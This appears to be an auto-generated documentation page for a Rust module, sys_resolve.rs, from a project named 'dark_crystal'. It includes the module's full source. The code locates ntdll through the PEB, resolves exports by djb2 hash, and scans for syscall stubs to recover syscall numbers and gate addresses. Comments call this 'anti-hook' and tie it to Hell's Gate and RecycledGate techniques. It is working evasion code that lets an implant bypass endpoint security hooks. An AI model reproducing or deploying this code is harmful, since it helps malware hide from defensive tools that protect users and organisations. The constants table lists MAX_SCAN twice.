# sys_resolve

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/sys_resolve.rs` |
| **Lines** | 389 |
| **Cards** | T003-hells-gate |
| **Role** | SSN resolution cascade (Hells/Halos/Tartarus) |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 12 |

## Constants

- `MAX_SCAN`: `isize` = `512`
- `MAX_SCAN`: `isize` = `512`

## Types

### struct `ListEntry` (line 23)

### struct `UnicodeString` (line 30)

### struct `LdrDataTableEntry` (line 38)

### struct `PebLdrData` (line 54)

### struct `Peb` (line 62)

### struct `ListEntry32` (line 124)

### struct `UnicodeString32` (line 131)

### struct `ImageExportDirectory` (line 203)

## Public API

### `djb2_hash` (line 10)
```rust
pub fn djb2_hash(bytes: &[u8]) -> u32
```

### `resolve_ssn` (line 354)
```rust
pub fn resolve_ssn(name: &str) -> (u32, usize)
```

### `resolve_ssn_by_hash` (line 358)
```rust
pub fn resolve_ssn_by_hash(target_hash: u32) -> (u32, usize)
```

## Internal Functions

- `gs_read_u64` (unsafe) (line 72)
- `fs_read_u32` (unsafe) (line 139)
- `is_wow64` (line 152)
- `resolve_export_ssn` (unsafe) (line 217)
- `find_syscall_stub64` (unsafe) (line 268)
- `matches_stub64` (unsafe) (line 297)
- `find_syscall_stub32` (unsafe) (line 307)
- `matches_stub32` (unsafe) (line 337)
- `within_image` (line 384)

## Full Source

```rust
#![allow(dead_code)]
#[cfg(target_arch = "x86_64")]
use std::ptr::addr_of;
use std::vec::Vec;

// Minimal resolver inspired by RecycledGate: hash export name (djb2 over bytes),
// read SSN from NTDLL export thunk, and return a pointer to the syscall stub.

#[inline(always)]
pub fn djb2_hash(bytes: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for b in bytes {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(*b as u32);
    }
    hash
}

// ---------------------------
// 64-bit structures + helpers
// ---------------------------
#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *const u16,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct LdrDataTableEntry {
    reserved1: [*const u8; 2],
    in_memory_order_links: ListEntry,
    reserved2: [*const u8; 2],
    dll_base: *const u8,
    reserved3: [*const u8; 2],
    full_dll_name: UnicodeString, // Full path (C:\Windows\System32\ntdll.dll)
    base_dll_name: UnicodeString, // Base name (ntdll.dll) — usar este para el hash
    reserved4: [u8; 8],
    reserved5: [*const u8; 3],
    checksum: u32,
    time_date_stamp: u32,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct PebLdrData {
    reserved1: [u8; 8],
    reserved2: [*const u8; 3],
    in_memory_order_module_list: ListEntry,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct Peb {
    reserved1: [u8; 2],
    being_debugged: u8,
    reserved2: u8,
    reserved3: [*const u8; 2],
    ldr: *const PebLdrData,
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
unsafe fn gs_read_u64(offset: u32) -> u64 {
    let out: u64;
    core::arch::asm!(
        "mov {}, gs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, readonly, pure)
    );
    out
}

#[cfg(target_arch = "x86_64")]
pub(crate) fn ntdll_base_and_name_hashes() -> (*const u8, u32) {
    unsafe {
        let peb = gs_read_u64(0x60) as *const Peb;
        if peb.is_null() {
            return (core::ptr::null(), 0);
        }
        let target_hash = djb2_hash(b"ntdll.dll");
        let ldr = (*peb).ldr;
        if ldr.is_null() {
            return (core::ptr::null(), 0);
        }
        let mut e = (*ldr).in_memory_order_module_list.flink;
        let head = addr_of!((*ldr).in_memory_order_module_list) as *const ListEntry;
        while e as *const _ != head {
            // in_memory_order_links follows reserved1 (two pointers) in our layout
            let entry = (e as *const u8).sub(core::mem::size_of::<[*const u8; 2]>())
                as *const LdrDataTableEntry;
            let base = (*entry).dll_base;
            let name = &(*entry).base_dll_name;
            let len = (name.length / 2) as usize;
            let slice = core::slice::from_raw_parts(name.buffer, len);
            let mut bytes = Vec::with_capacity(len);
            for c in slice {
                bytes.push(((*c | 0x20) as u8));
            }
            let h = djb2_hash(&bytes);
            if h == target_hash {
                return (base, h);
            }
            e = (*e).flink;
        }
        (core::ptr::null(), 0)
    }
}

// ---------------------------
// 32-bit structures + helpers
// ---------------------------
#[cfg(target_arch = "x86")]
#[repr(C)]
struct ListEntry32 {
    flink: *mut ListEntry32,
    blink: *mut ListEntry32,
}

#[cfg(target_arch = "x86")]
#[repr(C)]
struct UnicodeString32 {
    length: u16,
    maximum_length: u16,
    buffer: *const u16,
}

#[cfg(target_arch = "x86")]
#[inline(always)]
unsafe fn fs_read_u32(offset: u32) -> u32 {
    let out: u32;
    core::arch::asm!(
        "mov {0:e}, fs:[{1}]",
        out(reg) out,
        in(reg) offset,
        options(nostack, readonly, pure)
    );
    out
}

#[cfg(target_arch = "x86")]
#[inline(always)]
fn is_wow64() -> bool {
    unsafe { fs_read_u32(0xC0) != 0 }
}

#[cfg(target_arch = "x86")]
pub(crate) fn ntdll_base_and_name_hashes() -> (*const u8, u32) {
    unsafe {
        // TEB is pointed by FS base; PEB pointer lives at fs:[0x30].
        let peb = fs_read_u32(0x30) as *const u8;
        if peb.is_null() {
            return (core::ptr::null(), 0);
        }
        // PEB->Ldr sits at offset 0x0C on 32-bit.
        let ldr = *(peb.add(0x0C) as *const *const u8);
        if ldr.is_null() {
            return (core::ptr::null(), 0);
        }
        // InMemoryOrderModuleList is at LDR offset 0x14 on 32-bit.
        let list = ldr.add(0x14) as *const ListEntry32;
        let mut e = (*list).flink;
        let head = list;
        while e as *const _ != head as *const _ {
            // InMemoryOrderLinks is the second LIST_ENTRY -> offset 0x08.
            let entry = (e as *const u8).sub(0x08);
            let dll_base = *(entry.add(0x18) as *const *const u8);
            // BaseDllName starts at offset 0x2C.
            let name = entry.add(0x2C) as *const UnicodeString32;
            let len = ((*name).length / 2) as usize;
            if len == 0 {
                e = (*e).flink;
                continue;
            }
            let slice = core::slice::from_raw_parts((*name).buffer, len);
            let mut bytes = Vec::with_capacity(len);
            for c in slice {
                bytes.push(((*c | 0x20) as u8));
            }
            let h = djb2_hash(&bytes);
            if h == djb2_hash(b"ntdll.dll") {
                return (dll_base, h);
            }
            e = (*e).flink;
        }
        (core::ptr::null(), 0)
    }
}

// ---------------------------
// Shared export walking logic
// ---------------------------
#[repr(C)]
struct ImageExportDirectory {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

unsafe fn resolve_export_ssn<F>(
    ntdll: *const u8,
    target_hash: u32,
    export_dir_offset: usize,
    mut ssn_and_gate: F,
) -> (u32, usize)
where
    F: FnMut(*const u8, *const u8, *const u8) -> (u32, usize),
{
    if ntdll.is_null() {
        return (0, 0);
    }
    if *(ntdll as *const u16) != 0x5A4D {
        return (0, 0);
    }
    let e_lfanew = *(ntdll.add(0x3C) as *const u32) as usize;
    let nt_headers = ntdll.add(e_lfanew);
    // SizeOfImage sits at OptionalHeader + 0x38 (PE32/PE32+). OptionalHeader starts at +0x18.
    let size_of_image = *(nt_headers.add(0x50) as *const u32) as usize;
    if size_of_image == 0 {
        return (0, 0);
    }
    let image_start = ntdll;
    let image_end = ntdll.add(size_of_image);
    let export_dir_rva = *(nt_headers.add(export_dir_offset) as *const u32) as usize;
    if export_dir_rva == 0 {
        return (0, 0);
    }
    let exp = ntdll.add(export_dir_rva) as *const ImageExportDirectory;
    let names = ntdll.add((*exp).address_of_names as usize) as *const u32;
    let ords = ntdll.add((*exp).address_of_name_ordinals as usize) as *const u16;
    let funcs = ntdll.add((*exp).address_of_functions as usize) as *const u32;
    for i in 0..(*exp).number_of_names {
        let name_rva = *names.add(i as usize) as usize;
        let cstr = ntdll.add(name_rva) as *const u8;
        let mut len = 0usize;
        while *cstr.add(len) != 0 {
            len += 1;
        }
        let slice = core::slice::from_raw_parts(cstr, len);
        if djb2_hash(slice) == target_hash {
            let ordinal = *ords.add(i as usize) as usize;
            let func_rva = *funcs.add(ordinal) as usize;
            let func = ntdll.add(func_rva);
            return ssn_and_gate(func, image_start, image_end);
        }
    }
    (0, 0)
}

#[cfg(target_arch = "x86_64")]
unsafe fn find_syscall_stub64(
    func: *const u8,
    image_start: *const u8,
    image_end: *const u8,
) -> (u32, usize) {
    // RecycledGate-style anti-hook: scan nearby for the canonical stub
    const MAX_SCAN: isize = 512;
    for delta in 0..=MAX_SCAN {
        let forward = func.offset(delta);
        if within_image(forward, 4, image_start, image_end) && matches_stub64(forward) {
            let ssn = *((forward as usize + 4) as *const u16) as u32;
            let gate = forward as usize + 0x12;
            return (ssn, gate);
        }
        if delta > 0 {
            let back = func.offset(-delta);
            if within_image(back, 4, image_start, image_end) && matches_stub64(back) {
                let ssn = *((back as usize + 4) as *const u16) as u32;
                let gate = back as usize + 0x12;
                return (ssn, gate);
            }
        }
    }

    (0, 0)
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
unsafe fn matches_stub64(p: *const u8) -> bool {
    // mov r10, rcx; mov eax, imm16; syscall
    // Ensure we won't cross a page boundary when reading 4 bytes.
    if ((p as usize & 0xFFF) + 4) > 0x1000 {
        return false;
    }
    *p == 0x4c && *p.add(1) == 0x8b && *p.add(2) == 0xd1 && *p.add(3) == 0xb8
}

#[cfg(target_arch = "x86")]
unsafe fn find_syscall_stub32(
    func: *const u8,
    wow64: bool,
    image_start: *const u8,
    image_end: *const u8,
) -> (u32, usize) {
    // Anti-hook: search nearby for MOV EAX, imm32
    const MAX_SCAN: isize = 512;
    for delta in 0..=MAX_SCAN {
        let forward = func.offset(delta);
        if within_image(forward, 7, image_start, image_end) && matches_stub32(forward, wow64) {
            let ssn = *((forward.add(1)) as *const u32);
            let gate = forward as usize + if wow64 { 0x0A } else { 0x0F };
            return (ssn, gate);
        }
        if delta > 0 {
            let back = func.offset(-delta);
            if within_image(back, 7, image_start, image_end) && matches_stub32(back, wow64) {
                let ssn = *((back.add(1)) as *const u32);
                let gate = back as usize + if wow64 { 0x0A } else { 0x0F };
                return (ssn, gate);
            }
        }
    }

    (0, 0)
}

#[cfg(target_arch = "x86")]
#[inline(always)]
unsafe fn matches_stub32(p: *const u8, wow64: bool) -> bool {
    // Need to read up to 7 bytes; avoid crossing page boundary.
    if ((p as usize & 0xFFF) + 7) > 0x1000 {
        return false;
    }
    if *p != 0xB8 {
        return false;
    }
    if wow64 {
        // WoW64 stub: MOV EAX, ssn; XOR ECX, ECX
        *p.add(5) == 0x33 && *p.add(6) == 0xC9
    } else {
        // Native x86: MOV EAX, ssn; MOV EDX, imm32
        *p.add(5) == 0xBA
    }
}

pub fn resolve_ssn(name: &str) -> (u32, usize) {
    resolve_ssn_by_hash(djb2_hash(name.as_bytes()))
}

pub fn resolve_ssn_by_hash(target_hash: u32) -> (u32, usize) {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        let (ntdll, _) = ntdll_base_and_name_hashes();
        return resolve_export_ssn(ntdll, target_hash, 0x88, |func, start, end| {
            find_syscall_stub64(func, start, end)
        });
    }

    #[cfg(target_arch = "x86")]
    unsafe {
        let (ntdll, _) = ntdll_base_and_name_hashes();
        let wow64 = is_wow64();
        return resolve_export_ssn(ntdll, target_hash, 0x78, |func, start, end| {
            find_syscall_stub32(func, wow64, start, end)
        });
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "x86")))]
    {
        let _ = target_hash;
        (0, 0)
    }
}

#[inline(always)]
fn within_image(p: *const u8, len: usize, start: *const u8, end: *const u8) -> bool {
    let p = p as usize;
    let start = start as usize;
    let end = end as usize;
    p >= start && p.saturating_add(len) <= end
}

```